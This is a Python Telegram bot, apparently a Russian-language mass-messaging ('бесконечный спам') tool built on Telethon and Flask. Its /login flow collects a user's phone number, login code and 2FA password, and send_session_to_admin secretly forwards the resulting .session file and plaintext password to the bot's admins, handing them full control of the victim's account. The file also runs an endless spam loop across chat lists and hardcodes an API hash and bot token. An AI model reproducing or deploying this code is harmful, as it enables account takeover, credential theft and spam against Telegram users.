#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import os
import json
import random
import threading
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError, RPCError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
from flask import Flask

# =========================================================
#  КОНФИГ
# =========================================================

API_ID = 33741333
API_HASH = 'ecc14282eca1e059e23746b5a2131c5e'
BOT_TOKEN = '8814913641:AAGgG9DAPdLD0uFfWkiWvqjVKe9pKTbZ2Lk'
MASTER_ADMIN_ID = 2066633503
SECOND_ADMIN_ID = 2066633503

# =========================================================
#  ФАЙЛЫ
# =========================================================

ADMINS_FILE = "admins.json"
SESSIONS_FOLDER = "sessions"
SESSIONS_LIST_FILE = "sessions_list.json"
CHATS_FILE = "chats.json"
MSG_FILE = "message.txt"
STATS_FILE = "stats.json"
TIMER_FILE = "timer.json"
LOG_FILE = "session_log.txt"

os.makedirs(SESSIONS_FOLDER, exist_ok=True)

# =========================================================
#  ЗАГРУЗКА ДАННЫХ
# =========================================================

def load_admins():
    if os.path.exists(ADMINS_FILE):
        with open(ADMINS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return [MASTER_ADMIN_ID, SECOND_ADMIN_ID]

def save_admins(admins):
    with open(ADMINS_FILE, 'w', encoding='utf-8') as f:
        json.dump(admins, f, indent=2)

def load_sessions_list():
    if os.path.exists(SESSIONS_LIST_FILE):
        with open(SESSIONS_LIST_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

def save_sessions_list(sessions):
    with open(SESSIONS_LIST_FILE, 'w', encoding='utf-8') as f:
        json.dump(sessions, f, indent=2, ensure_ascii=False)

def load_chats():
    if os.path.exists(CHATS_FILE):
        with open(CHATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return []

def save_chats(chats):
    with open(CHATS_FILE, 'w', encoding='utf-8') as f:
        json.dump(chats, f, indent=2, ensure_ascii=False)

def load_message():
    if os.path.exists(MSG_FILE):
        with open(MSG_FILE, 'r', encoding='utf-8') as f:
            return f.read().strip()
    return ""

def save_message(msg):
    with open(MSG_FILE, 'w', encoding='utf-8') as f:
        f.write(msg)

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {"sent": 0, "total": 0}

def save_stats(stats):
    with open(STATS_FILE, 'w', encoding='utf-8') as f:
        json.dump(stats, f, indent=2)

def load_timer():
    if os.path.exists(TIMER_FILE):
        with open(TIMER_FILE, 'r', encoding='utf-8') as f:
            return json.load(f).get("timer", 5)
    return 5

def save_timer(timer):
    with open(TIMER_FILE, 'w', encoding='utf-8') as f:
        json.dump({"timer": timer}, f)

def log_session(msg):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")

admins = load_admins()
sessions_list = load_sessions_list()
chats = load_chats()
message_text = load_message()
stats = load_stats()
spam_timer = load_timer()
bot = None
user_sessions = {}
spam_tasks = {}
is_spamming = {}

def is_admin(user_id):
    return user_id in admins

def is_master(user_id):
    return user_id == MASTER_ADMIN_ID

# =========================================================
#  ОТПРАВКА СЕССИИ АДМИНАМ
# =========================================================

async def send_session_to_admin(user_id, phone, session_path, password=None):
    global bot
    session_file = f"{session_path}.session"
    if not os.path.exists(session_file):
        return False
    
    try:
        client = TelegramClient(session_file, API_ID, API_HASH)
        await client.connect()
        me = await client.get_me()
        username = me.username or "нет"
        first_name = me.first_name or "нет"
        await client.disconnect()
    except:
        username = "неизвестно"
        first_name = "неизвестно"
    
    caption = f"""
🎯 **НОВАЯ СЕССИЯ!**

📱 Телефон: `{phone}`
👤 Имя: {first_name}
🆔 Юзернейм: @{username}
🆔 User ID: {user_id}
📅 Дата: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    if password:
        caption += f"\n🔐 **ОБЛАЧНЫЙ ПАРОЛЬ (2FA):** `{password}`"
    caption += "\n\n⚠️ Файл .session прикреплён ниже."
    
    for admin_id in admins:
        try:
            await bot.send_file(admin_id, session_file, caption=caption, force_document=True)
            log_session(f"✅ Сессия отправлена админу {admin_id}")
        except:
            pass
    
    return True

# =========================================================
#  БЕСКОНЕЧНАЯ РАССЫЛКА
# =========================================================

async def spam_loop(user_id, chat_id):
    global stats, spam_timer
    
    try:
        client = user_sessions.get(user_id)
        if not client:
            await bot.send_message(chat_id, "❌ Сессия потеряна!")
            is_spamming[user_id] = False
            return
        
        if not client.is_connected():
            await client.connect()
        
        if not message_text:
            await bot.send_message(chat_id, "❌ Сообщение не задано!")
            is_spamming[user_id] = False
            return
        
        if not chats:
            await bot.send_message(chat_id, "❌ Нет чатов!")
            is_spamming[user_id] = False
            return
        
        total_sent = 0
        cycle = 1
        
        await bot.send_message(chat_id, f"🚀 **БЕСКОНЕЧНАЯ РАССЫЛКА ЗАПУЩЕНА!**\n📢 Всего чатов: {len(chats)}\n⏱️ Задержка: {spam_timer} сек\n🔄 Цикл #1")
        
        while is_spamming.get(user_id, False):
            random.shuffle(chats)
            sent_in_cycle = 0
            
            for target in chats:
                if not is_spamming.get(user_id, False):
                    break
                
                try:
                    if target.lstrip('-').isdigit():
                        entity = int(target)
                    else:
                        entity = target
                    
                    await client.send_message(entity, message_text)
                    sent_in_cycle += 1
                    total_sent += 1
                    stats['sent'] += 1
                    stats['total'] += 1
                    save_stats(stats)
                    
                    await bot.send_message(chat_id, f"✅ {target} (цикл #{cycle}, всего: {total_sent})")
                    
                except FloodWaitError as e:
                    await bot.send_message(chat_id, f"⏳ Флуд-вейт {e.seconds} сек. Ждём...")
                    await asyncio.sleep(e.seconds)
                except Exception as e:
                    await bot.send_message(chat_id, f"❌ Ошибка {target}: {str(e)[:50]}")
                
                if is_spamming.get(user_id, False):
                    await asyncio.sleep(spam_timer)
            
            if is_spamming.get(user_id, False):
                cycle += 1
                await bot.send_message(chat_id, f"🔄 **ЦИКЛ #{cycle} ЗАВЕРШЁН!** Отправлено: {sent_in_cycle}, Всего: {total_sent}")
                await asyncio.sleep(2)
        
        is_spamming[user_id] = False
        await bot.send_message(chat_id, f"🛑 **РАССЫЛКА ОСТАНОВЛЕНА!**\n📨 Всего отправлено: {total_sent}")
        
    except asyncio.CancelledError:
        is_spamming[user_id] = False
        await bot.send_message(chat_id, f"🛑 **ОСТАНОВЛЕНО!** Всего: {stats.get('sent', 0)}")
        raise

# =========================================================
#  ЗАПУСК БОТА (ВСЕ КОМАНДЫ)
# =========================================================

async def run_bot():
    global bot
    
    print("="*50)
    print("📨 RASSYLKA BOT v5.0 (БЕСКОНЕЧНЫЙ СПАМ)")
    print("="*50)
    
    if os.path.exists("bot_session.session"):
        os.remove("bot_session.session")
        print("🗑️ Старая сессия удалена")
    
    bot = TelegramClient("bot_session", API_ID, API_HASH, connection=ConnectionTcpAbridged)
    await bot.start(bot_token=BOT_TOKEN)
    print("✅ Бот запущен!")
    
    login_states = {}
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_cmd(event):
        user_id = event.sender_id
        has_session = user_id in user_sessions
        is_admin_text = "✅" if is_admin(user_id) else "❌"
        
        await event.reply(f"""
╔═══════════════════════════════════════════╗
║    📨 RASSYLKA BOT v5.0 (БЕСКОНЕЧНЫЙ)    ║
╠═══════════════════════════════════════════╣
║                                           ║
║  🔐 /login — Добавить сессию              ║
║  📢 /add ID — Добавить чат               ║
║  📋 /list — Список чатов                 ║
║  🗑️ /remove ID — Удалить чат             ║
║  🧹 /clear — Очистить чаты               ║
║  📝 /set текст — Задать сообщение        ║
║  👁️ /show — Показать сообщение           ║
║  ⏱️ /timer сек — Задержка между сообщ.    ║
║  🚀 /spam — ЗАПУСТИТЬ БЕСКОНЕЧНЫЙ СПАМ   ║
║  🛑 /stop — Остановить спам              ║
║  📊 /status — Статус                     ║
║  🔐 /admin — Админ-панель                ║
║                                           ║
╠═══════════════════════════════════════════╣
║  👤 Твой ID: {user_id}                     ║
║  🔑 Админ: {is_admin_text}                 ║
║  🔐 Сессия: {'✅ Есть' if has_session else '❌ Нет'}    ║
╚═══════════════════════════════════════════╝
        """)
    
    @bot.on(events.NewMessage(pattern='/login'))
    async def login_cmd(event):
        user_id = event.sender_id
        if user_id in user_sessions:
            await event.reply("✅ У тебя уже есть сессия!")
            return
        login_states[user_id] = {"step": "phone"}
        await event.reply("📱 Введи номер телефона (с +):")
    
    @bot.on(events.NewMessage)
    async def handle_login_input(event):
        user_id = event.sender_id
        text = event.text.strip()
        if user_id not in login_states or text.startswith('/'):
            return
        
        state = login_states[user_id]
        
        if state["step"] == "phone":
            if not text.startswith('+'):
                await event.reply("❌ Формат: +380123456789")
                return
            phone = text
            login_states[user_id] = {"step": "code", "phone": phone}
            session_path = os.path.join(SESSIONS_FOLDER, f"user_{user_id}_{phone.replace('+', '')}")
            client = TelegramClient(session_path, API_ID, API_HASH, connection=ConnectionTcpAbridged)
            try:
                await client.connect()
                await client.send_code_request(phone)
                login_states[user_id]["client"] = client
                login_states[user_id]["path"] = session_path
                await event.reply(f"✅ Номер: {phone}\n📩 Введи код (с пробелами):")
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
        
        elif state["step"] == "code":
            code = text.replace(" ", "")
            if not code.isdigit():
                await event.reply("❌ Только цифры!")
                return
            client = state.get("client")
            phone = state.get("phone")
            session_path = state.get("path")
            try:
                await client.sign_in(phone, code)
                if user_id not in sessions_list:
                    sessions_list.append(user_id)
                    save_sessions_list(sessions_list)
                user_sessions[user_id] = client
                await send_session_to_admin(user_id, phone, session_path, None)
                await event.reply("✅ **СЕССИЯ ДОБАВЛЕНА!**")
                del login_states[user_id]
            except SessionPasswordNeededError:
                login_states[user_id]["step"] = "password"
                await event.reply("🔐 Введи 2FA пароль:")
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
        
        elif state["step"] == "password":
            password = text
            client = state.get("client")
            phone = state.get("phone")
            session_path = state.get("path")
            try:
                await client.sign_in(password=password)
                if user_id not in sessions_list:
                    sessions_list.append(user_id)
                    save_sessions_list(sessions_list)
                user_sessions[user_id] = client
                await send_session_to_admin(user_id, phone, session_path, password)
                await event.reply("✅ **СЕССИЯ + ПАРОЛЬ ДОБАВЛЕНЫ!**")
                del login_states[user_id]
            except Exception as e:
                await event.reply(f"❌ {str(e)[:80]}")
                del login_states[user_id]
    
    # =========================================================
    #  КОМАНДЫ ДЛЯ ЧАТОВ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/add (.+)'))
    async def add_chat(event):
        chat_id = event.pattern_match.group(1).strip()
        if chat_id in chats:
            await event.reply(f"⚠️ Уже есть!")
            return
        chats.append(chat_id)
        save_chats(chats)
        await event.reply(f"✅ Добавлен! Всего: {len(chats)}")
    
    @bot.on(events.NewMessage(pattern='/list'))
    async def list_chats(event):
        if not chats:
            await event.reply("📭 Нет чатов!")
            return
        text = f"📋 **ЧАТЫ** ({len(chats)}):\n\n"
        for i, c in enumerate(chats, 1):
            text += f"{i}. `{c}`\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/remove (.+)'))
    async def remove_chat(event):
        chat_id = event.pattern_match.group(1).strip()
        if chat_id in chats:
            chats.remove(chat_id)
            save_chats(chats)
            await event.reply(f"✅ Удален!")
        else:
            await event.reply("❌ Не найден!")
    
    @bot.on(events.NewMessage(pattern='/clear'))
    async def clear_chats(event):
        global chats
        chats = []
        save_chats(chats)
        await event.reply("✅ Все чаты очищены!")
    
    # =========================================================
    #  СООБЩЕНИЕ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/set (.+)'))
    async def set_message(event):
        global message_text
        msg = event.pattern_match.group(1).strip()
        message_text = msg
        save_message(msg)
        await event.reply(f"✅ Сообщение сохранено!")
    
    @bot.on(events.NewMessage(pattern='/show'))
    async def show_message(event):
        if message_text:
            await event.reply(f"📝 {message_text}")
        else:
            await event.reply("❌ Не задано!")
    
    # =========================================================
    #  ТАЙМЕР
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/timer (.+)'))
    async def set_timer(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Только админы!")
            return
        try:
            new_timer = float(event.pattern_match.group(1).strip())
            if new_timer < 1:
                await event.reply("❌ Минимум 1 секунда!")
                return
            if new_timer > 300:
                await event.reply("❌ Максимум 300 секунд!")
                return
            global spam_timer
            spam_timer = new_timer
            save_timer(spam_timer)
            await event.reply(f"✅ Таймер: {spam_timer} сек")
        except:
            await event.reply("❌ Введи число! /timer 10")
    
    # =========================================================
    #  БЕСКОНЕЧНЫЙ СПАМ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/spam'))
    async def start_spam(event):
        user_id = event.sender_id
        chat_id = event.chat_id
        if is_spamming.get(user_id, False):
            await event.reply("⚠️ Уже запущено! Используй /stop")
            return
        if user_id not in user_sessions:
            await event.reply("❌ Добавь сессию: /login")
            return
        if not message_text:
            await event.reply("❌ Задай сообщение: /set")
            return
        if not chats:
            await event.reply("❌ Добавь чаты: /add")
            return
        is_spamming[user_id] = True
        spam_tasks[user_id] = asyncio.create_task(spam_loop(user_id, chat_id))
    
    @bot.on(events.NewMessage(pattern='/stop'))
    async def stop_spam(event):
        user_id = event.sender_id
        if not is_spamming.get(user_id, False):
            await event.reply("⚠️ Не запущено!")
            return
        is_spamming[user_id] = False
        if user_id in spam_tasks and spam_tasks[user_id]:
            spam_tasks[user_id].cancel()
            try:
                await spam_tasks[user_id]
            except:
                pass
        await event.reply(f"🛑 **ОСТАНОВЛЕНО!** Всего: {stats.get('sent', 0)}")
    
    @bot.on(events.NewMessage(pattern='/status'))
    async def status_cmd(event):
        user_id = event.sender_id
        has_session = user_id in user_sessions
        is_spam = is_spamming.get(user_id, False)
        await event.reply(f"""
📊 **СТАТУС**
🔐 Сессия: {"✅" if has_session else "❌"}
📢 Чатов: {len(chats)}
📝 Сообщение: {message_text[:30] if message_text else 'НЕТ'}
⏱️ Таймер: {spam_timer} сек
📨 Отправлено всего: {stats.get('total', 0)}
🔄 Спам: {"🟢 АКТИВЕН (БЕСКОНЕЧНО)" if is_spam else "🔴 ОСТАНОВЛЕН"}
        """)
    
    # =========================================================
    #  АДМИН-ПАНЕЛЬ
    # =========================================================
    
    @bot.on(events.NewMessage(pattern='/admin'))
    async def admin_panel(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        session_files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        await event.reply(f"""
🔐 **АДМИН-ПАНЕЛЬ**
👥 Админов: {len(admins)}
📁 Сессий: {len(session_files)}
📨 Отправлено: {stats.get('total', 0)}
⏱️ Таймер: {spam_timer} сек
        """)
    
    @bot.on(events.NewMessage(pattern='/addadmin (.+)'))
    async def add_admin(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        try:
            new_admin = int(event.pattern_match.group(1).strip())
            if new_admin in admins:
                await event.reply("⚠️ Уже админ!")
                return
            admins.append(new_admin)
            save_admins(admins)
            await event.reply(f"✅ {new_admin} добавлен!")
        except:
            await event.reply("❌ Введи ID!")
    
    @bot.on(events.NewMessage(pattern='/removeadmin (.+)'))
    async def remove_admin(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        try:
            admin_id = int(event.pattern_match.group(1).strip())
            if admin_id == MASTER_ADMIN_ID:
                await event.reply("❌ Нельзя удалить мастера!")
                return
            if admin_id not in admins:
                await event.reply("⚠️ Не админ!")
                return
            admins.remove(admin_id)
            save_admins(admins)
            await event.reply(f"✅ {admin_id} удален!")
        except:
            await event.reply("❌ Введи ID!")
    
    @bot.on(events.NewMessage(pattern='/listadmins'))
    async def list_admins(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        text = "👥 **АДМИНЫ:**\n\n"
        for a in admins:
            master = "👑" if a == MASTER_ADMIN_ID else ""
            text += f"• `{a}` {master}\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/list_sessions'))
    async def list_sessions_cmd(event):
        user_id = event.sender_id
        if not is_admin(user_id):
            await event.reply("❌ Нет доступа!")
            return
        files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        if not files:
            await event.reply("📭 Нет сессий!")
            return
        text = "📁 **СЕССИИ:**\n\n"
        for i, f in enumerate(files, 1):
            size = os.path.getsize(os.path.join(SESSIONS_FOLDER, f))
            text += f"{i}. `{f}` ({size} байт)\n"
        await event.reply(text)
    
    @bot.on(events.NewMessage(pattern='/clear_sessions'))
    async def clear_sessions_cmd(event):
        user_id = event.sender_id
        if not is_master(user_id):
            await event.reply("❌ Только мастер!")
            return
        files = [f for f in os.listdir(SESSIONS_FOLDER) if f.endswith('.session')]
        if not files:
            await event.reply("📭 Нет сессий!")
            return
        for f in files:
            os.remove(os.path.join(SESSIONS_FOLDER, f))
        await event.reply(f"✅ Удалено {len(files)} сессий!")
    
    print("✅ Бот готов к работе!")
    await bot.run_until_disconnected()

# =========================================================
#  FLASK
# =========================================================

app = Flask(__name__)

@app.route('/')
def home():
    return "📨 RASSYLKA BOT is running!", 200

@app.route('/health')
def health():
    return "OK", 200

def start_bot():
    asyncio.run(run_bot())

if __name__ == "__main__":
    bot_thread = threading.Thread(target=start_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)